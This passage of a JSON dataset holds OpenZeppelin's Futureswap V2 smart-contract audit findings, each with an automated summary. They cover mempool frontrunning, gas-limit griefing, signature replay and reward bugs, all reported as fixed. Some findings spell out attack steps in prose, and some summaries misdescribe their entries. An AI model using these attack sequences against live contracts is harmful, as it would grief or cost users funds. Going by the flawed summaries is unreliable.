      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Futureswap V2 Audit",
      "source_link": "https://blog.openzeppelin.com/futureswap-v2-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11142",
      "title": "[L01] The public snapshot function of FsToken and LiquidityToken may be abused to increase gas costs",
      "impact": "LOW",
      "content": "The `FsToken` and `LiquidityToken` contracts inherit from [the `ERC20Snapshot` contract](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v2.5.1/contracts/drafts/ERC20Snapshot.sol), which has a [public `snapshot` function](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v2.5.1/contracts/drafts/ERC20Snapshot.sol#L46) that anyone can call at any time. There are potential risks to having this `snapshot` function be public. The risk are outlined [in the comments](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.1.0/contracts/token/ERC20/ERC20Snapshot.sol#L81) of the OpenZeppelin Contracts v3.1.0 of `ERC20Snapshot.sol`, quoted below.\n\n\n\n```\n* [WARNING]\n* ====\n* While an open way of calling {_snapshot} is required for certain trust minimization mechanisms such as forking,\n* you must consider that it can potentially be used by attackers in two ways.\n*\n* First, it can be used to increase the cost of retrieval of values from snapshots, although it will grow\n* logarithmically thus rendering this attack ineffective in the long term. Second, it can be used to target\n* specific accounts and increase the cost of ERC20 transfers for them, in the ways specified in the Gas Costs\n* section above.\n\n```\n\nIf this is a concern, then consider upgrading to use `v3.1.0` of the `ERC20Snapshot` contract, which makes the `snapshot` function internal. Alternatively, consider modifying the `v2.5.1` contract to make the `snapshot` function internal.\n\n\n**Update:** *Fixed in [PR #532](https://github.com/futureswap/fs-core/pull/532), where the `snapshot` function is now access-controlled.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Futureswap V2 Audit",
      "source_link": "https://blog.openzeppelin.com/futureswap-v2-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11141",
      "title": "[M08] Attackers may cause honest users to be penalized under some conditions",
      "impact": "MEDIUM",
      "content": "In the [`MessageProcessor` contract](https://github.com/futureswap/fs_core/blob/96255fc4a550a5f34681c117b5969b848d07b3a3/contracts/messageProcessor/MessageProcessor.sol), if the [`callAddLiquidity`](https://github.com/futureswap/fs_core/blob/96255fc4a550a5f34681c117b5969b848d07b3a3/contracts/messageProcessor/MessageProcessor.sol#L661), [`callRemoveLiquidity`](https://github.com/futureswap/fs_core/blob/96255fc4a550a5f34681c117b5969b848d07b3a3/contracts/messageProcessor/MessageProcessor.sol#L676), [`callOpenTrade`](https://github.com/futureswap/fs_core/blob/96255fc4a550a5f34681c117b5969b848d07b3a3/contracts/messageProcessor/MessageProcessor.sol#L691), and/or [`callCloseTrade`](https://github.com/futureswap/fs_core/blob/96255fc4a550a5f34681c117b5969b848d07b3a3/contracts/messageProcessor/MessageProcessor.sol#L711) function uses more than 64 times the amount of gas used by the [`takePenalty` function](https://github.com/futureswap/fs_core/blob/96255fc4a550a5f34681c117b5969b848d07b3a3/contracts/messageProcessor/MessageProcessor.sol#L790), then an attacker can cause honest users to be penalized when they shouldn’t be.\n\n\nThe attack works as follows. The attacker can monitor the mempool for incoming transactions from honest users (to, say, the [`addLiquidity` function](https://github.com/futureswap/fs_core/blob/96255fc4a550a5f34681c117b5969b848d07b3a3/contracts/messageProcessor/MessageProcessor.sol#L122)), grab the parameters out of the transaction, frontrun the user’s transaction with the attacker’s own transaction that submits the same parameters, but carefully chooses the `gasLimit` for the attack transaction such that the call to [`callAddLiquidity`](https://github.com/futureswap/fs_core/blob/96255fc4a550a5f34681c117b5969b848d07b3a3/contracts/messageProcessor/MessageProcessor.sol#L136) (within the `addLiquidity` function) would fail with an out-of-gas error during its [call to the `Exchange` contract](https://github.com/futureswap/fs_core/blob/96255fc4a550a5f34681c117b5969b848d07b3a3/contracts/messageProcessor/MessageProcessor.sol#L671). This would not cause the transaction to revert, but instead cause `success` to be `false`. Then, because only 63/64 of the remaining gas was forwarded during the call to the exchange, there would be enough gas left over to execute the [`if (!success)` block](https://github.com/futureswap/fs_core/blob/96255fc4a550a5f34681c117b5969b848d07b3a3/contracts/messageProcessor/MessageProcessor.sol#L138-L148), which penalizes the user.\n\n\nThis vulnerability is not present in the current code with the current opcode pricing. However, it could be an issue if Ethereum opcodes are repriced, or if future upgrades change the gas usage of these functions.\n\n\nConsider adding a `minGas` parameter to the `userMessage`, and reverting during the [`verifyCommonParams` function](https://github.com/futureswap/fs_core/blob/96255fc4a550a5f34681c117b5969b848d07b3a3/contracts/messageProcessor/MessageProcessor.sol#L538) if `gasleft() < minGas`. This way, the user/UI can set the minimum amount of gas a relayer can use to process their transaction.\n\n\n**Update:** *Fixed in PRs [#533](https://github.com/futureswap/fs-core/pull/533) and [#537](https://github.com/futureswap/fs-core/pull/537), where the user can now specify a minimum amount of gas that the relayer must provide when submitting the user’s message and signature.*",
      "summary": "\nThis bug report is about a vulnerability in the MessageProcessor contract, which is a part of the fs_core system. This vulnerability could be exploited by an attacker to cause honest users to be penalized when they shouldn’t be. The attack works by the attacker monitoring the mempool for incoming transactions from honest users, grabbing the parameters out of the transaction, and frontrunning the user’s transaction with the attacker’s own transaction. The attacker carefully chooses the gasLimit for the attack transaction such that the call to the Exchange contract would fail with an out-of-gas error. This would not cause the transaction to revert, but instead cause success to be false, and the user would be penalized.\n\nTo fix this vulnerability, the developers have added a minGas parameter to the userMessage, and reverted during the verifyCommonParams function if gasleft() < minGas. This way, the user/UI can set the minimum amount of gas a relayer can use to process their transaction. This vulnerability has been fixed in PRs #533 and #537.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Futureswap V2 Audit",
      "source_link": "https://blog.openzeppelin.com/futureswap-v2-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11140",
      "title": "[M07] Refunded tokens can become stuck in the Wallet contract",
      "impact": "MEDIUM",
      "content": "The [`Wallet.refund` function](https://github.com/futureswap/fs_core/blob/96255fc4a550a5f34681c117b5969b848d07b3a3/contracts/wallet/Wallet.sol#L340) can be called by anyone. It transfers `_amount` of `_tokenAddress` tokens from `msg.sender` to the Wallet contract, and credits `_userAddress`. If `_tokenAddress` has `decimals != 18` then the tokens transferred to the contract via this function may become stuck in the Wallet contract and require an upgrade to remove them.\n\n\nConsider having the `refund` function wrap the input token if necessary. Otherwise, consider documenting that the `refund` function should not be called with any `_tokenAddress` that does not have `decimals == 18`.\n\n\n**Update:** *Fixed in [PR #515](https://github.com/futureswap/fs-core/pull/515), where the `refund` function now reverts if the token does not have 18 decimals.*",
      "summary": "\nThis bug report is about the [`Wallet.refund` function](https://github.com/futureswap/fs_core/blob/96255fc4a550a5f34681c117b5969b848d07b3a3/contracts/wallet/Wallet.sol#L340). This function allows anyone to transfer tokens from the sender to the Wallet contract, and credit a different user. However, if the token used does not have 18 decimals, the tokens can become stuck in the Wallet contract and require an upgrade to remove them.\n\nThe report suggests that the `refund` function should be modified to wrap the input token if necessary, or at least document that the function should not be used with tokens that do not have 18 decimals. This issue was later fixed in [PR #515](https://github.com/futureswap/fs-core/pull/515), where the `refund` function now reverts if the token does not have 18 decimals.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Futureswap V2 Audit",
      "source_link": "https://blog.openzeppelin.com/futureswap-v2-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11139",
      "title": "[M06] Lack of event emissions during important actions",
      "impact": "MEDIUM",
      "content": "There are several actions that perhaps should be emitting events but aren’t, such as: adding/removing wallet access, adding/removing price oracles, adding/removing exchanges, calling the [`doFireRegistryUpdateEvent` function](https://github.com/futureswap/fs_core/blob/96255fc4a550a5f34681c117b5969b848d07b3a3/contracts/registry/Registry.sol#L203), setting the various addresses via the `owner`, approving/vetoing in the `Voting` contract, etc.\n\n\nEvent emission is particularly important when adding/removing oracles and adding/removing wallet access because oracles and wallet accessors are not tracked in iterable objects. Without events to search, users will have a difficult time learning which addresses are oracles and which addresses have wallet access.\n\n\nConsider reviewing all actions on the platform and adding event emissions when changes are made to important state variables.\n\n\n**Update:** *Fixed in [PR #528](https://github.com/futureswap/fs-core/pull/528/) where events are now emitted when mappings in the registry are updated. It may still be worthwhile to add more events during other important actions, but the this fix covers the most important changes (changes to important variables stored in non-iterable data types).*",
      "summary": "\nThis bug report is about the lack of event emissions when making changes to important state variables in the Futureswap platform. Specifically, when adding/removing wallet access, adding/removing price oracles, adding/removing exchanges, calling the `doFireRegistryUpdateEvent` function, setting the various addresses via the `owner`, approving/vetoing in the `Voting` contract, etc. Without events to search, users will have a difficult time learning which addresses are oracles and which addresses have wallet access.\n\nThe issue has been fixed in PR #528, where events are now emitted when mappings in the registry are updated. It may still be worthwhile to add more events during other important actions, but the this fix covers the most important changes (changes to important variables stored in non-iterable data types).",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Futureswap V2 Audit",
      "source_link": "https://blog.openzeppelin.com/futureswap-v2-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11138",
      "title": "[M05] The instantWithdraw function’s userMessage may be generic enough to introduce replay issues between platforms",
      "impact": "MEDIUM",
      "content": "The user’s signature for a call to the `instantWithdraw` function [is over generic data](https://github.com/futureswap/fs_core/blob/96255fc4a550a5f34681c117b5969b848d07b3a3/contracts/messageProcessor/MessageProcessor.sol#L413) that does not include any Futureswap-specific data. In particular, the user signs a struct that contains only a public token `address`, a `uint256 amount`, and a `uint256 userInteractionNumber`.\n\n\nIt is not unlikely that a user may interact with another DeFi platform (e.g., a platform that mimics Futureswap’s meta transactions pattern) that also asks them to sign messages of this type. If that happens, then anyone can replay the user’s signature — which was intended for another platform — to Futureswap, causing the user’s funds to be instant-withdrawn to their wallet.\n\n\nThis does not result in any theft of funds, because the funds are withdrawn to the user’s own external account. However, it could be a griefing vector.\n\n\nConsider requiring that the `userMessage` include something Futureswap-specific.\n\n\n**Update:** *Fixed in [PR #495](https://github.com/futureswap/fs-core/pull/495), where the user’s signature now covers the Futureswap-specific `Registry` contract address.*",
      "summary": "\nThis bug report is about Futureswap's `instantWithdraw` function. It states that the user's signature for the function does not include any Futureswap-specific data, which means that a signature intended for another platform can be replayed to Futureswap, causing the user's funds to be instant-withdrawn to their wallet. This does not result in theft of funds, as the funds are withdrawn to the user's own external account, but it could be a griefing vector. The report suggests that the userMessage should include something Futureswap-specific to prevent this. The bug was fixed in PR #495, where the user's signature now covers the Futureswap-specific `Registry` contract address.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Futureswap V2 Audit",
      "source_link": "https://blog.openzeppelin.com/futureswap-v2-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11137",
      "title": "[M04] The updatePayoutDistribution function does not correctly update the sumOfExchangeWeights on all exchanges",
      "impact": "MEDIUM",
      "content": "The [`for loop`](https://github.com/futureswap/fs_core/blob/96255fc4a550a5f34681c117b5969b848d07b3a3/contracts/incentives/Incentives.sol#L152-L157) in the `Incentives.updatePayoutDistribution` function is intended to update the `sumOfExchangeWeights` value for every exchange. However, the code is incorrect, and results in only a single exchange updating the its `sumOfExchangeWeights` value to the same value `allExchangeAddresses.length` many times.\n\n\nThe result is that all but one exchange will have an incorrect `sumOfExchangeWeights` until the next time the [`advanceWeek()` function](https://github.com/futureswap/fs_core/blob/96255fc4a550a5f34681c117b5969b848d07b3a3/contracts/incentives/Incentives.sol#L81) is called.\n\n\nConsider refactoring this loop to correctly update the `sumOfExchangeWeights` on all exchanges.\n\n\n**Update:** *Fixed in [PR #514](https://github.com/futureswap/fs-core/pull/514).*",
      "summary": "\nA bug was reported in the `Incentives.updatePayoutDistribution` function of the `fs_core` repository. The code in this function contained a `for loop` which was intended to update the `sumOfExchangeWeights` value for every exchange, but there was an error in the code which caused only a single exchange to update its `sumOfExchangeWeights` value to the same value `allExchangeAddresses.length` many times. As a result, all but one exchange had an incorrect `sumOfExchangeWeights` until the next time the `advanceWeek()` function was called. It was recommended to refactor the loop to correctly update the `sumOfExchangeWeights` on all exchanges. The bug was fixed in PR #514.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Futureswap V2 Audit",
      "source_link": "https://blog.openzeppelin.com/futureswap-v2-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11136",
      "title": "[M03] Unchecked output of the ECDSA recover function",
      "impact": "MEDIUM",
      "content": "The [`ECDSA.recover` function](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v2.5.1/contracts/cryptography/ECDSA.sol#L28) (in version `2.5.1`) returns `address(0)` if the signature provided is invalid. This function is used twice in the Futureswap code: Once [to recover an `oracleAddress` from an `oracleSignature`](https://github.com/futureswap/fs_core/blob/96255fc4a550a5f34681c117b5969b848d07b3a3/contracts/messageProcessor/MessageProcessor.sol#L845), and again [to recover the user’s address from their signature](https://github.com/futureswap/fs_core/blob/96255fc4a550a5f34681c117b5969b848d07b3a3/contracts/messageProcessor/MessageProcessor.sol#L535).\n\n\nIf the oracle signature was invalid, the `oracleAddress` is set to `address(0)`. Similarly, if the user’s signature is invalid, then [the `userMessage.signer`](https://github.com/futureswap/fs_core/blob/96255fc4a550a5f34681c117b5969b848d07b3a3/contracts/messageProcessor/MessageProcessor.sol#L517) or [the `withDrawer`](https://github.com/futureswap/fs_core/blob/96255fc4a550a5f34681c117b5969b848d07b3a3/contracts/messageProcessor/MessageProcessor.sol#L418) is set to `address(0)`.\n\n\nThis can result in unintended behavior. For example, it allows users to perform some interactions on behalf of the zero address, or (in the unlikely event that `address(0)` were ever added as an oracle) it could allow all invalid `oracleSignature`s to be accepted as valid.\n\n\nConsider reverting if the output of the `ECDSA.recover` is ever `address(0)`. Also, consider modifying the [`Registry.addOracle` function](https://github.com/futureswap/fs_core/blob/96255fc4a550a5f34681c117b5969b848d07b3a3/contracts/registry/Registry.sol#L241) so that `address(0)` can never be added as an oracle.\n\n\n**Update:** *Fixed in [PR #493](https://github.com/futureswap/fs-core/pull/493).*",
      "summary": "\nThis bug report is about the `ECDSA.recover` function in the OpenZeppelin Contracts version 2.5.1 which is used twice in the Futureswap code. This function returns the address of the user or oracle if the signature provided is valid, but it returns `address(0)` if the signature is invalid. This can cause unintended behavior, such as allowing users to perform some interactions on behalf of the zero address, or allowing all invalid `oracleSignature`s to be accepted as valid.\n\nThe bug has been fixed in Pull Request #493. The fix suggests reverting the output if it is ever `address(0)` and modifying the `Registry.addOracle` function so that `address(0)` can never be added as an oracle.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Futureswap V2 Audit",
      "source_link": "https://blog.openzeppelin.com/futureswap-v2-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11135",
      "title": "[M02] Users can add collateral to closed trades",
      "impact": "MEDIUM",
      "content": "During our audit, the Futureswap team independently discovered that users were capable of adding collateral to closed trades. Consider calling the [`ensureTradeOpen` function](https://github.com/futureswap/fs_core/blob/96255fc4a550a5f34681c117b5969b848d07b3a3/contracts/exchange/Trading.sol#L737) during the [`Trading.addCollateral` function](https://github.com/futureswap/fs_core/blob/96255fc4a550a5f34681c117b5969b848d07b3a3/contracts/exchange/Trading.sol#L601) to prevent this.\n\n\n**Update:** *Fixed in [PR #503](https://github.com/futureswap/fs-core/pull/503/).*",
      "summary": "\nFutureswap is a platform for users to trade in digital assets. During an audit of the platform, it was found that users were able to add collateral to trades that had already been closed. This bug was fixed in a pull request (#503) on the Futureswap Github repository. To prevent this issue from happening in the future, a function called 'ensureTradeOpen' should be called during the 'Trading.addCollateral' function. This will ensure that no collateral can be added to a closed trade.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Futureswap V2 Audit",
      "source_link": "https://blog.openzeppelin.com/futureswap-v2-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11134",
      "title": "[M01] Not using upgrade safe contracts in FsToken inheritance",
      "impact": "MEDIUM",
      "content": "The `FsToken` contract is intended to be an upgradeable contract, used behind a proxy (namely, the `FsTokenProxy` contract).  \n\nHowever, the contracts `ERC20Snapshot`, `ERC20Mintable` and `ERC20Burnable` in the inheritance chain of `FsToken` are *not* imported from the upgrade safe library [`@openzeppelin/contracts-ethereum-package`](https://github.com/OpenZeppelin/openzeppelin-contracts-ethereum-package) but instead from [`@openzeppelin/contracts`](https://github.com/OpenZeppelin/openzeppelin-contracts/).\n\n\nFrom the [README file](https://github.com/OpenZeppelin/openzeppelin-contracts-ethereum-package/tree/v2.5.0/#extending-contracts) of the upgrades safe library:\n\n\n\n> \n> **you must use this package** and not @openzeppelin/contracts if you are writing upgradeable contracts.\n> \n> \n> \n\n\nIn particular, using the upgrades safe library in this case will ensure the inheritance from `Initializable` and the other contracts is always linearized as expected by the compiler (see this [forum post](https://forum.openzeppelin.com/t/why-is-initializable-inheritance-required-everywhere/284) for more info about it).\n\n\n**Update:** *Fixed in [PR #534](https://github.com/futureswap/fs-core/pull/534/files), where the FsToken was moved to [another repo](https://github.com/futureswap/fs_token) and adjusted to use the upgrade safe version.*",
      "summary": "\nThis bug report is about the `FsToken` contract, which is an upgradeable contract used behind a `FsTokenProxy` contract. The issue is that the contracts `ERC20Snapshot`, `ERC20Mintable` and `ERC20Burnable` in the inheritance chain of `FsToken` are not imported from the upgrade safe library `@openzeppelin/contracts-ethereum-package` but instead from `@openzeppelin/contracts`. This could cause issues with the compiler linearizing the inheritance from `Initializable` as expected. The issue has been fixed by moving the FsToken to another repo and adjusting it to use the upgrade safe version.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Futureswap V2 Audit",
      "source_link": "https://blog.openzeppelin.com/futureswap-v2-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11133",
      "title": "[H03] MessageProcessor interactions can be frontrun for profit",
      "impact": "HIGH",
      "content": "Anyone can take the `oracleMessage` and `oracleSignature` from a valid transaction in the mempool — whether it is being broadcast by an oracle, or by a user who sets their `userInteractionNumber` to an odd number — and rebroadcast it in their own function call using a one-wei-higher gas price. This frontruns the honest sender’s transaction and gives the frontrunner the reward from [`maybePaySender`](https://github.com/futureswap/fs_core/blob/96255fc4a550a5f34681c117b5969b848d07b3a3/contracts/messageProcessor/MessageProcessor.sol#L804). It also results in the honest sender wasting gas (because their transaction will revert when `reserve` is called by [`ensureUnusedUserInteractionNumber`](https://github.com/futureswap/fs_core/blob/96255fc4a550a5f34681c117b5969b848d07b3a3/contracts/messageProcessor/MessageProcessor.sol#L631) in the [`verifyCommonParams` function](https://github.com/futureswap/fs_core/blob/96255fc4a550a5f34681c117b5969b848d07b3a3/contracts/messageProcessor/MessageProcessor.sol#L538).\n\n\nThis is profitable for the frontrunner as long as the `amount` of the reward from `maybePaySender` is greater than the cost of gas used to frontrun. Under these conditions, one could expect bots to frontrun all `MessageProcessor` interactions of this type. While the user’s trades would execute as intended, the honest senders would operate at a loss.\n\n\nConsider adding access controls so that only `userMessage.signer`, or a valid oracle, can successfully call the functions that invoke the `maybePaySender` function.\n\n\n**Update:** *Fixed in [PR #494](https://github.com/futureswap/fs-core/pull/494), where the relayer must now be approved by a trusted offline “stamper” in order to submit the user’s message and signature.*",
      "summary": "\nThis bug report is about a vulnerability in the MessageProcessor contract of the Futureswap Core project. The vulnerability allows anyone to take a valid transaction from the mempool and rebroadcast it with a higher gas price, which frontruns the honest sender's transaction and results in the honest sender wasting gas. This is profitable for the frontrunner as long as the reward from the transaction is greater than the cost of gas used to frontrun. This could lead to bots frontrunning all MessageProcessor interactions of this type. \n\nTo fix this vulnerability, the report suggests adding access controls so that only the user's signer or a valid oracle can successfully call the functions that invoke the maybePaySender function. This issue has been fixed in Pull Request #494, where the relayer must now be approved by a trusted offline “stamper” in order to submit the user’s message and signature.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Futureswap V2 Audit",
      "source_link": "https://blog.openzeppelin.com/futureswap-v2-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11132",
      "title": "[H02] Liquidity rewards are computed incorrectly for a week if any liquidity provider removes liquidity during the week",
      "impact": "HIGH",
      "content": "The [`calculateLiquidityProviderPayout` function](https://github.com/futureswap/fs_core/blob/96255fc4a550a5f34681c117b5969b848d07b3a3/contracts/incentives/Incentives.sol#L359) computes the amount of FST rewards that a liquidity provider should earn in proportion to the share of `totalLiquidity` that they provided. However, the function [assumes](https://github.com/futureswap/fs_core/blob/96255fc4a550a5f34681c117b5969b848d07b3a3/contracts/incentives/Incentives.sol#L370) that the `totalLiquidity` provided for the week is `liquidityToken.totalSupplyAt(weekEntry.snapShotId)`. This assumption is incorrect if any liquidity providers have removed liquidity after the snapshot was taken and before the end of the week. The error results in liquidity providers receiving fewer FST rewards than they ought to receive. The size of the error scales with the total amount of liquidity that has been removed, and so can be exacerbated by a malicious whale.\n\n\nThis is a known issue that is described [in a code comment](https://github.com/futureswap/fs_core/blob/96255fc4a550a5f34681c117b5969b848d07b3a3/contracts/incentives/Incentives.sol#L321-L329) within the `payoutLiquidityProvider` function. In the comment, a valid solution to the problem is proposed:\n\n\n\n> \n>  Solution: To decrement the total supply of liquidity for that week when a LP withdraws up to a maximum of their starting balance.\n> \n> \n> \n\n\nHowever, this solution is not implemented in the code. Consider implementing this solution.\n\n\n**Update:** *Fixed in [PR #526](https://github.com/futureswap/fs-core/pull/526), where the solution in the code comment mentioned above has been implemented.*",
      "summary": "\nThis bug report is about the `calculateLiquidityProviderPayout` function in the `Incentives.sol` code. This function is used to compute the amount of FST rewards that a liquidity provider should earn in proportion to the share of total liquidity they provided. However, the function assumes that the total liquidity provided for the week is the same as the `totalSupplyAt` the snapshot was taken. This assumption is incorrect if any liquidity providers have removed liquidity after the snapshot and before the end of the week, resulting in liquidity providers receiving fewer FST rewards than they ought to get. \n\nA solution to the problem was proposed in a code comment within the `payoutLiquidityProvider` function, which suggests to decrement the total supply of liquidity for that week when a LP withdraws up to a maximum of their starting balance. However, this solution was not implemented in the code. \n\nThe issue has now been fixed in PR #526, where the solution in the code comment mentioned above was implemented.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Futureswap V2 Audit",
      "source_link": "https://blog.openzeppelin.com/futureswap-v2-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11131",
      "title": "[H01] Attackers can prevent honest users from performing an instant withdraw from the Wallet contract",
      "impact": "HIGH",
      "content": "An attacker who sees an honest user’s call to [`MessageProcessor.instantWithdraw`](https://github.com/futureswap/fs_core/blob/96255fc4a550a5f34681c117b5969b848d07b3a3/contracts/messageProcessor/MessageProcessor.sol#L410) in the mempool can grab the `oracleMessage` and `oracleSignature` parameters from the user’s transaction, then submit their own transaction to `instantWithdraw` using the same parameters, a higher gas price (so as to frontrun the honest user’s transaction), and carefully choosing the gas limit for their transactions such that the internal call to the `callInstantWithdraw` will fail [on line 785](https://github.com/futureswap/fs_core/blob/96255fc4a550a5f34681c117b5969b848d07b3a3/contracts/messageProcessor/MessageProcessor.sol#L785) with an out-of-gas error, but will successfully execute the [`if(!success)` block](https://github.com/futureswap/fs_core/blob/96255fc4a550a5f34681c117b5969b848d07b3a3/contracts/messageProcessor/MessageProcessor.sol#L431-LL440).\n\n\nThe result is that the attacker’s instant withdraw will fail (so the user will not receive their funds), but the `userInteractionNumber` will be successfully reserved by the `ReplayTracker`. As a result, the honest user’s transaction will revert because it will be attempting to use a `userInteractionNumber` that is no longer valid.\n\n\nConsider adding an access control mechanism to restrict who can submit `oracleMessage`s on behalf of the user.\n\n\n**Update:** *Fixed in [PR #494](https://github.com/futureswap/fs-core/pull/494/files), where the relayer who transmits the transaction must be approved by a trusted offline “stamper”, and in PRs [#533](https://github.com/futureswap/fs_core/pull/533) and [#537](https://github.com/futureswap/fs-core/pull/537), where the user can now specify a minimum amount of gas that must be passed along by the relayer.*",
      "summary": "\nThis bug report describes a vulnerability in the MessageProcessor.instantWithdraw function of the Futureswap core. An attacker can see an honest user's call to the function in the mempool, grab the oracleMessage and oracleSignature parameters from the user's transaction, and submit their own transaction to instantWithdraw using the same parameters and a higher gas price. The attacker can then carefully choose the gas limit for their transaction such that the internal call to the callInstantWithdraw will fail with an out-of-gas error, but will successfully execute the if(!success) block. This means the attacker's instant withdraw fails, but the userInteractionNumber is still reserved by the ReplayTracker. As a result, the honest user's transaction reverts because it is attempting to use an invalid userInteractionNumber.\n\nTo fix this vulnerability, access control mechanisms have been added to restrict who can submit oracleMessages on behalf of the user. This is done in PRs #494, #533, and #537, where the relayer must be approved by a trusted offline “stamper” and the user can specify a minimum amount of gas that must be passed along by the relayer.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Futureswap V2 Audit",
      "source_link": "https://blog.openzeppelin.com/futureswap-v2-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11130",
      "title": "Rewards",
      "impact": "HIGH",
      "content": "Liquidity providers who keep their liquidity in an exchange for an entire week-long window earn rewards in the form of Futureswap tokens (FST). Similarly, users who trade on a Futureswap exchange also earn FST.\n\n\nWhen users sign messages to close a trade, their message contains a “referral” address. This address also receives FST rewards, and is a way for third-party UIs to profit from users who user their UI. (Users can, of course, add their own address as the `referral` address).\n\n\nThe FST are non-transferable tokens, and are used to vote on governance decisions.",
      "summary": "\nFutureswap is a decentralized exchange that rewards users for providing liquidity and trading on the exchange. Liquidity providers who keep their liquidity on the exchange for an entire week-long window earn rewards in the form of Futureswap tokens (FST). Similarly, traders who use the exchange also earn FST. When users sign messages to close a trade, their message contains a “referral” address. This address also receives FST rewards, and is a way for third-party UIs to profit from users who use their UI. Users can also add their own address as the “referral” address. FST is a non-transferable token and is used to vote on governance decisions.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Futureswap V2 Audit",
      "source_link": "https://blog.openzeppelin.com/futureswap-v2-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11129",
      "title": "Exchanges",
      "impact": "HIGH",
      "content": "A Futureswap [`Exchange`](https://github.com/futureswap/fs_core/blob/96255fc4a550a5f34681c117b5969b848d07b3a3/contracts/exchange/Exchange.sol) is defined by [an asset token and a stablecoin](https://github.com/futureswap/fs_core/blob/96255fc4a550a5f34681c117b5969b848d07b3a3/contracts/exchange/Exchange.sol#L31). An exchange can be created by governance via the [`ExchangeFactory`](https://github.com/futureswap/fs_core/blob/96255fc4a550a5f34681c117b5969b848d07b3a3/contracts/exchange/ExchangeFactory.sol). Liquidity providers can add liquidity to the exchange, in exchange for non-transferable [liquidity tokens](https://github.com/futureswap/fs_core/blob/96255fc4a550a5f34681c117b5969b848d07b3a3/contracts/liquidity/LiquidityToken.sol). These liquidity tokens represent a share of the exchange’s liquidity and can be redeemed.\n\n\nTraders can open leveraged long or short positions with up to 20x leverage.",
      "summary": "\nFutureswap is a decentralized exchange platform that allows users to trade assets with up to 20x leverage. The exchange is created by governance via the ExchangeFactory and liquidity can be added to the exchange by liquidity providers in exchange for non-transferable liquidity tokens. These tokens represent a share of the exchange’s liquidity and can be redeemed. Traders can open leveraged long or short positions with up to 20x leverage. This bug report is about the ExchangeFactory, which is responsible for creating the exchange. It is defined by an asset token and a stablecoin, and is used to add liquidity to the exchange.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Futureswap V2 Audit",
      "source_link": "https://blog.openzeppelin.com/futureswap-v2-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11128",
      "title": "Meta transactions and off-chain oracles",
      "impact": "HIGH",
      "content": "Futureswap leverages meta-transactions and a trusted off-chain oracle in a novel way in order to prevent oracle frontrunning issues. First, the user signs a message containing the parameters that describe the action they want to take. For example, if they want to open a long position, they would sign parameters that indicate which asset they want exposure to, how much capital they want to put at risk, how much leverage they want to use, the min and max asset prices they’re willing to tolerate, etc.\n\n\nNext, the user (or a relayer) passes this signature and message to the off-chain oracle, which appends price information for the asset and stablecoins being used, the time at which the oracle signed the message, etc. In this way, the oracle’s signed message *includes* the user’s message and signature, in addition to price data and any other data needed to execute the user’s intended action.\n\n\nFinally, the oracle’s message and signature can then be used to execute the operation by passing them along as parameters in a function call to the Futureswap [`MessageProcessor` contract](https://github.com/futureswap/fs_core/blob/96255fc4a550a5f34681c117b5969b848d07b3a3/contracts/messageProcessor/MessageProcessor.sol).  \n\nThe `MessageProcessor` contract enforces the user-chosen bounds. In this way, the oracle cannot force a user to take any action without the user agreeing.\n\n\nEach 